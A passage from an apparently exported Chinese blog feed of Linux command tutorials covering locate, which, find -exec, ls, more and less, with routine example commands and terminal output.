pwd/bin/pwd/etc/.pwd.lock/sbin/unix_chkpwd/usr/bin/pwdx/usr/include/pwd.h/usr/lib/python2.7/dist-packages/twisted/python/fakepwd.py/usr/lib/python2.7/dist-packages/twisted/python/fakepwd.pyc/usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.py/usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.pyc/usr/lib/syslinux/pwd.c32/usr/share/help/C/empathy/irc-join-pwd.page/usr/share/help/ca/empathy/irc-join-pwd.page/usr/share/help/cs/empathy/irc-join-pwd.page/usr/share/help/de/empathy/irc-join-pwd.page/usr/share/help/el/empathy/irc-join-pwd.page 实例2：搜索 etc 目录下所有以 sh 开头的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1locate /etc/sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[peida-VirtualBox ~] # locate /etc/sh/etc/shadow/etc/shadow-/etc/shells[peida-VirtualBox ~] # 实例3：搜索 etc 目录下，所有以 m 开头的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1locate /etc/m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[peida-VirtualBox ~] # locate /etc/m/etc/magic/etc/magic.mime/etc/mailcap/etc/mailcap.order/etc/manpath.config/etc/mate-settings-daemon]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- which]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F16.%20Linux%20%E5%91%BD%E4%BB%A4-%20which%2F</url>
    <content type="text"><![CDATA[Linux 命令- which&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们经常在linux要查找某个文件，但不知道放在哪里了，可以使用下面的一些命令来搜索： which 查看可执行文件的位置。 whereis 查看文件的位置。 locate 配合数据库查看文件位置。 find 实际搜寻硬盘查询文件名称。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;which命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。 1.命令格式1which [可执行文件名称] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;which 指令会在 PATH 变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。 3.命令参数 -n:指定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名。 -p：与 -n 参数相同，但此处的抱愧了文件的路径。 -w：指定输出时栏位的宽度。 -V：显示版本信息。 4.使用实例实例1：查找文件、显示命令路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1which lsmod &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# which pwd/bin/pwd[root@localhost ~]# which adduser/usr/sbin/adduser[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;which 是根据使用者所配置的 PATH 变量内的目录去搜索可运行档的！所以，不同的 PATH 配置内容所找到的命令当然不一样！ 实例2：用 which 去找出 which&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1which which &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# which whichalias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde' /usr/bin/which[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;竟然会有两个 which ，其中一个是 alias 就是所谓的 “命令别名”，意思是输入 which 会等于后面接的那串命令！ 实例3：找出 cd 这个命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1which cd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cd 这个常用的命令竟然找不到。为什么呢？这是因为 cd 是 bash 内建的命令！但是 which 默认是找 PATH 内所规范的目录，所以一定找不到的！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令之 exec]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F20.%20find%20%E5%91%BD%E4%BB%A4%E4%B9%8B%20exec%2F</url>
    <content type="text"><![CDATA[find 命令之 exec&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;find是我们很常用的一个Linux命令，但是我们一般查找出来的并不仅仅是看看而已，还会有进一步的操作，这个时候exec的作用就显现出来了。 exec解释：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;{} 花括号代表前面find查找出来的文件名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用find时，只要把想要的操作写在一个文件里，就可以用exec来配合find查找，很方便的。在有些操作系统中只允许-exec选项执行诸如l s或ls -l这样的命令。大多数用户使用这一选项是为了查找旧文件并删除它们。建议在真正执行rm命令删除文件之前，最好先用ls命令看一下，确认它们是所要删除的文件。 exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{ }，一个空格和一个\，最后是一个分号。为了使用exec选项，必须要同时使用print选项。如果验证一下find命令，会发现该命令只输出从当前路径起的相对路径及文件名。 使用实例实例1：ls -l 命令放在 find 命令的 -exec 选项中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type d -exec ls -l &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# find . -type f -exec ls -l &#123;&#125; \; -rw-r--r-- 1 root root 127 10-28 16:51 ./log2014.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test4/log3-2.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test4/log3-3.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test4/log3-1.log-rw-r--r-- 1 root root 33 10-28 16:54 ./log2013.log-rw-r--r-- 1 root root 302108 11-03 06:19 ./log2012.log-rw-r--r-- 1 root root 25 10-28 17:02 ./log.log-rw-r--r-- 1 root root 37 10-28 17:07 ./log.txt-rw-r--r-- 1 root root 0 10-28 14:47 ./test3/log3-2.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test3/log3-3.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test3/log3-1.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例中，find 命令匹配到了当前目录下的所有普通文件，并在 -exec 选项中使用 ls -l 命令将他们列出来。 实例2：在目录中查找更改时间在 n 日以前的文件并删除它们&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -mtime +14 -exec rm &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test]# ll总计 328-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 33 10-28 16:54 log2013.log-rw-r--r-- 1 root root 127 10-28 16:51 log2014.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.log-rw-r--r-- 1 root root 25 10-28 17:02 log.log-rw-r--r-- 1 root root 37 10-28 17:07 log.txtdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4[root@localhost test]# find . -type f -mtime +14 -exec rm &#123;&#125; \;[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 shell 中用任何方式删除文件之前，应当先查看相应的文件，一定要小心！当使用诸如 mv 或 rm 命令时，可以使用 -exec 选项的安全模式。它将在对每个匹配到的文件进行操作之前提示你。 实例3：在目录中查找更改时间在 n 日以前的文件并删除它们，在删除之前先给出提示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" -mtime +5 -ok rm &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -name "*.log" -mtime +5 -ok rm &#123;&#125; \;&lt; rm ... ./log_link.log &gt; ? y&lt; rm ... ./log2012.log &gt; ? n[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上例中，find 命令在当前目录中查找所有文件名以 .log 结尾、更改时间在5日以上的文件，并删除它们，只不过在删除之前先给出提示。按 y 键删除文件，按 n 键不删除。 实例4：-exec 中使用 grep 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc -name "passwd*" -exec grep "root" &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# find /etc -name "passwd*" -exec grep "root" &#123;&#125; \;root:x:0:0:root:/root:/bin/bashroot:x:0:0:root:/root:/bin/bash[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;任何形式的命令都可以在 -exec 选项中使用。在上例中使用 grep 命令。find 命令首先匹配所有文件名为 “passwd” 的文件，例如：passwd、passwd.old、paaswd.bak，然后执行 grep 命令看看在这些文件中是否存在一个 root 用户。 实例5：查找文件移动到指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" -exec mv &#123;&#125; .. \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost test]# ll总计 12drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:49 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# cd test3/[root@localhost test3]# ll总计 304-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.log[root@localhost test3]# find . -name "*.log" -exec mv &#123;&#125; .. \;[root@localhost test3]# ll总计 0[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:50 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# 实例6：用 exec 选项执行 cp 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" -exec cp &#123;&#125; test3 \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost test3]# ll总计 0[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:50 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -name "*.log" -exec cp &#123;&#125; test3 \;cp: “./test3/log2014.log” 及 “test3/log2014.log” 为同一文件cp: “./test3/log2013.log” 及 “test3/log2013.log” 为同一文件cp: “./test3/log2012.log” 及 “test3/log2012.log” 为同一文件[root@localhost test]# cd test3[root@localhost test3]# ll总计 304-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test3]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ls]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F2.%20Linux%20%E5%91%BD%E4%BB%A4-ls%2F</url>
    <content type="text"><![CDATA[Linux 命令-lsls 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls命令是linux下最常用的命令。ls命令就是list的缩写，缺省下ls用来打印出当前目录的清单。如果ls指定其他目录，那么就会显示指定目录里的文件及文件夹清单。 通过ls 命令不仅可以查看linux文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。ls 命令在日常的linux操作中用的很多! 1.命令格式1ls [选项] [目录名] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出目标目录中所有的子目录和文件 3.常用参数： -a，-all 列出目录下所有的文件，包括以 . 开头的隐藏文件 -A 同 -a，但不列出“.”（表示当前目录）和“..”（表示当前目录的父目录） -c 配合 -lt：根据 ctime 排序及显示 ctime （文件状态最后更改的时间）配合 -l：显示 ctime 但根据名称排序否则根据 ctime 排序 -C 每栏由上至下列出项目 -color[=WHEN] 控制是否使用色彩分辨文件。WHEN 可以是‘never’、‘always’或‘auto’其中之一 -d，-directory 将目录象文件一样显示，而不是显示其下的文件 -D, –dired 产生适合 Emacs 的 dired 模式使用的结果 -f 对输出的文件不进行排序，-aU 选项生效，-lst 选项失效 -g 类似 -l,但不列出所有者 -G, –no-group 不列出任何有关组的信息 -h, –human-readable 以容易理解的格式列出文件大小 (例如 1K 234M 2G) –si 类似 -h,但文件大小取 1000 的次方而不是 1024 -H, –dereference-command-line 使用命令列中的符号链接指示的真正目的地 –indicator-style=方式 指定在每个项目名称后加上指示符号&lt;方式&gt;：none (默认)，classify (-F)，file-type (-p) -i, –inode 印出每个文件的 inode 号 -I, –ignore=样式 不印出任何符合 shell 万用字符&lt;样式&gt;的项目 -k 即 –block-size=1K,以 k 字节的形式表示文件的大小。 -l 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来。 -L, –dereference 当显示符号链接的文件信息时，显示符号链接所指示的对象而并非符号链接本身的信息 -m 所有项目以逗号分隔，并填满整行行宽 -o 类似 -l,显示文件的除组信息外的详细信息。 -r, –reverse 依相反次序排列 -R, –recursive 同时列出所有子目录层 -s, –size 以块大小为单位列出所有文件的大小 -S 根据文件大小排序 –sort=WORD 以下是可选用的 WORD 和它们代表的相应选项： extension -X status -c none -U time -t size -S atime -u time -t access -u version -v use -u -t 以文件修改时间排序 -u 配合 -lt:显示访问时间而且依访问时间排序 配合 -l:显示访问时间但根据名称排序 否则：根据访问时间排序 -U 不进行排序;依文件系统原有的次序列出项目 -v 根据版本进行排序 -w, –width=COLS 自行指定屏幕宽度而不使用目前的数值 -x 逐行列出项目而不是逐栏列出 -X 根据扩展名排序 -1 每行只列出一个文件 –help 显示此帮助信息并离开 –version 显示版本信息并离开 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，平时工作中最常用的是 -l 、-h 、-r 、-t 4.常用范例例1：列出/home/peidachang文件夹下的所有文件和目录的详细资料&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l -R /home/peidachang &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种形式和上面的命令形式执行的结果是完全一样的。另外，如果命令的操作对象位于当前目录中，可以直接对操作对象进行操作;如果不在当前目录则需要给出操作对象的完整路径，例如上面的例子中，我的当前文件夹是peidachang文件夹，我想对home文件夹下的peidachang文件进行操作，我可以直接输入 ls -lR peidachang，也可以用 ls -lR /home/peidachang。 例2：列出当前目录中所有以“t”开头的目录的详细内容，可以使用如下命令：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l t* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以查看当前目录下文件名以“t”开头的所有文件的信息。其实，在命令格式中，方括号内的内容都是可以省略的，对于命令ls而言，如果省略命令参数和操作对象，直接输入“ ls ”，则将会列出当前工作目录的内容清单。 例3：只列出文件下的子目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -F /opt/soft |grep /$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出 /opt/soft 文件下面的子目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost opt]# ls -F /opt/soft |grep /$jdk1.6.0_16/subversion-1.6.1/tomcat6.0.32/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l /opt/soft | grep "^d" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出 /opt/soft 文件下面的子目录详细情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost opt]# ls -l /opt/soft | grep "^d"drwxr-xr-x 10 root root 4096 09-17 18:17 jdk1.6.0_16drwxr-xr-x 16 1016 1016 4096 10-11 03:25 subversion-1.6.1drwxr-xr-x 9 root root 4096 2011-11-01 tomcat6.0.32 例4：列出目前工作目录下所有名称是s 开头的档案，愈新的排愈后面，可以使用如下命令：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -ltr s* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415[root@localhost opt]# ls -ltr s*src:总计 0script:总计 0soft:总计 350644drwxr-xr-x 9 root root 4096 2011-11-01 tomcat6.0.32-rwxr-xr-x 1 root root 81871260 09-17 18:15 jdk-6u16-linux-x64.bindrwxr-xr-x 10 root root 4096 09-17 18:17 jdk1.6.0_16-rw-r--r-- 1 root root 205831281 09-17 18:33 apache-tomcat-6.0.32.tar.gz-rw-r--r-- 1 root root 5457684 09-21 00:23 tomcat6.0.32.tar.gz-rw-r--r-- 1 root root 4726179 10-10 11:08 subversion-deps-1.6.1.tar.gz-rw-r--r-- 1 root root 7501026 10-10 11:08 subversion-1.6.1.tar.gzdrwxr-xr-x 16 1016 1016 4096 10-11 03:25 subversion-1.6.1 例5：列出目前工作目录下所有档案及目录;目录于名称后加”/“, 可执行档于名称后加”*“&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -AF &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12[root@localhost opt]# ls -AFlog/ script/ soft/ src/ svndata/ web/ 例6：计算当前目录下的文件数和目录数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 12ls -l * |grep "^-"|wc -l ---文件个数 ls -l * |grep "^d"|wc -l ---目录个数 例7: 在ls中列出文件的绝对路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls | sed "s:^:`pwd`/:" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost opt]# ls | sed "s:^:`pwd`/:" /opt/log/opt/script/opt/soft/opt/src/opt/svndata/opt/web 例8：列出当前目录下的所有文件（包括隐藏文件）的绝对路径， 对目录不做递归&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1find $PWD -maxdepth 1 | xargs ls -ld &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost opt]# find $PWD -maxdepth 1 | xargs ls -lddrwxr-xr-x 8 root root 4096 10-11 03:43 /optdrwxr-xr-x 2 root root 4096 2012-03-08 /opt/logdrwxr-xr-x 2 root root 4096 2012-03-08 /opt/script drwxr-xr-x 5 root root 4096 10-11 03:21 /opt/softdrwxr-xr-x 2 root root 4096 2012-03-08 /opt/srcdrwxr-xr-x 4 root root 4096 10-11 05:22 /opt/svndatadrwxr-xr-x 4 root root 4096 10-09 00:45 /opt/web 例9：递归列出当前目录下的所有文件（包括隐藏文件）的绝对路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1find $PWD | xargs ls -ld 例10：指定文件时间输出格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -tl --time-style=full-iso &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123[root@localhost soft]# ls -tl --time-style=full-iso 总计 350644drwxr-xr-x 16 1016 1016 4096 2012-10-11 03:25:58.000000000 +0800 subversion-1.6.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令: 1ls -ctl --time-style=long-iso &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123[root@localhost soft]# ls -ctl --time-style=long-iso总计 350644drwxr-xr-x 16 1016 1016 4096 2012-10-11 03:25 subversion-1.6.1 扩展：1. 显示彩色目录列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开/etc/bashrc, 加入如下一行: alias ls="ls --color" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下次启动bash时就可以像在Slackware里那样显示彩色的目录列表了, 其中颜色的含义如下: 蓝色–&gt;目录 绿色–&gt;可执行文件 红色–&gt;压缩文件 浅蓝色–&gt;链接文件 灰色–&gt;其他文件]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- more]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F12.%20Linux%20%E5%91%BD%E4%BB%A4-%20more%2F</url>
    <content type="text"><![CDATA[Linux 命令- more&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;more命令，功能类似 cat ，cat命令是整个文件的内容从上到下显示在屏幕上。 more会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能 。more命令从前向后读取文件，因此在启动时就加载整个文件。 1．命令格式1more [-dlfpcsu ] [-num ] [+/ pattern] [+ linenum] [file ... ] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;more命令和cat的功能一样都是查看文件里的内容，但有所不同的是more可以按页来查看文件的内容，还支持直接跳转行等功能。 3．命令参数 +n 从笫n行开始显示 定义屏幕大小为n行 +/pattern 在每个档案显示前搜寻该字串（pattern），然后从该字串前两行之后开始显示 -c 从顶部清屏，然后显示 -d 提示“Press space to continue，’q’ to quit（按空格键继续，按q键退出）”，禁用响铃功能 -l 忽略Ctrl+l（换页）字符 -p 通过清除窗口而不是滚屏来对文件进行换页，与-c选项相似 -s 把连续的多个空行显示为一行 -u 把文件内容中的下画线去掉 4．常用操作命令： Enter 向下n行，需要定义。默认为1行 Ctrl+F 向下滚动一屏 空格键 向下滚动一屏 Ctrl+B 返回上一屏 = 输出当前行的行号 ：f 输出文件名和当前行的行号 V 调用vi编辑器 !命令 调用Shell，并执行命令 q 退出more 5．命令实例：实例1：显示文件中从第3行起的内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1more +3 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415[root@localhost test]# cat log2012.log 2012-012012-022012-032012-04-day12012-04-day22012-04-day3======[root@localhost test]# more +3 log2012.log 2012-032012-04-day12012-04-day22012-04-day3======[root@localhost test]# 实例2：从文件中查找第一个出现”day3”字符串的行，并从该处前两行开始显示输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1more +/day3 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# more +/day3 log2012.log ...skipping2012-04-day12012-04-day22012-04-day32012-052012-05-day1======[root@localhost test]# 实例3：设定每屏显示行数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1more -5 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost test]# more -5 log2012.log 2012-012012-022012-032012-04-day12012-04-day2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最下面显示了该屏展示的内容占文件总行数的比例，按 Ctrl+F 或者 空格键 将会显示下一屏5条内容，百分比也会跟着变化。 实例4：列一个目录下的文件，由于内容太多，我们应该学会用more来分页显示。这得和管道 | 结合起来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l | more -5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011[root@localhost test]# ls -l | more -5总计 36-rw-r--r-- 1 root root 308 11-01 16:49 log2012.log-rw-r--r-- 1 root root 33 10-28 16:54 log2013.log-rw-r--r-- 1 root root 127 10-28 16:51 log2014.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.log-rw-r--r-- 1 root root 25 10-28 17:02 log.log-rw-r--r-- 1 root root 37 10-28 17:07 log.txtdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每页显示5个文件信息，按 Ctrl+F 或者 空格键 将会显示下5条文件信息。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- less]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F13.%20Linux%E5%91%BD%E4%BB%A4-%20less%2F</url>
    <content type="text"><![CDATA[Linux 命令- less&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;less 工具也是对文件或其它输出进行分页显示的工具，应该说是linux正统查看文件内容的工具，功能极其强大。less 的用法比起 more 更加的有弹性。在 more 的时候，我们并没有办法向前面翻， 只能往后面看，但若使用了 less 时，就可以使用 [pageup] [pagedown] 等按键的功能来往前往后翻看文件，更容易用来查看一个文件的内容！除此之外，在 less 里头可以拥有更多的搜索功能，不止可以向下搜，也可以向上搜。 命令格式1less [参数] [文件] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载真个文件。 命令参数 -b &lt;缓冲区大小&gt; 设置缓冲区的大小 -e 当文件显示结束后，自动离开 -f 强迫打开特殊文件，例如外围设备代号、目录和二进制文件 -g 只标志最后搜索的关键词 -i 忽略搜索时的大小写 -m 显示类似more命令的百分比 -N 显示每行的行号 -o &lt;文件名&gt; 将less 输出的内容在指定文件中保存起来 -Q 不使用警告音 -s 显示连续空行为一行 -S 行过长时间将超出部分舍弃 -x &lt;数字&gt; 将“tab”键显示为规定的数字空格 /字符串：向下搜索“字符串”的功能 ?字符串：向上搜索“字符串”的功能 n：重复前一个搜索（与 / 或 ? 有关） N：反向重复前一个搜索（与 / 或 ? 有关） b 向后翻一页 d 向后翻半页 h 显示帮助界面 Q 退出less 命令 u 向前滚动半页 y 向前滚动一行 空格键 滚动一行 回车键 滚动一页 [pagedown]： 向下翻动一页 [pageup]： 向上翻动一页 使用实例实例1：查看文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1less log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例2：ps 查看进程信息并通过 less 分页显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef | less &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例3：查看命令示例使用记录并通过 less 分页显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1history | less &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940[root@localhost test]# history | less22 scp -r tomcat6.0.32 root@192.168.120.203:/opt/soft23 cd ..24 scp -r web root@192.168.120.203:/opt/25 cd soft26 ls27 scp -r jdk1.6.0_16/ root@192.168.120.203:/opt/soft28 clear29 vim /etc/profile30 vim /etc/profile31 cd tomcat6.0.32/bin/32 ls33 ./shutdown.sh34 ./startup.sh35 vim startup.sh36 ls37 echo $JAVA_HOME38 java39 ls40 ls41 clear42 cd /opt43 ls44 cp apache-tomcat-6.0.32.tar.gz soft/45 ls46 rm -f apache-tomcat-6.0.32.tar.gz 47 ls48 cd soft49 ls50 tar -vzf apache-tomcat-6.0.32.tar.gz 51 tar -vzfx apache-tomcat-6.0.32.tar.gz 52 tar -zxvf apache-tomcat-6.0.32.tar.gz 53 ls54 cd apache-tomcat-6.0.3255 ls56 cd ..57 mv apache-tomcat-6.0.32 tomcat6.0.3258 ls59 cd tomcat6.0.32/60 ls 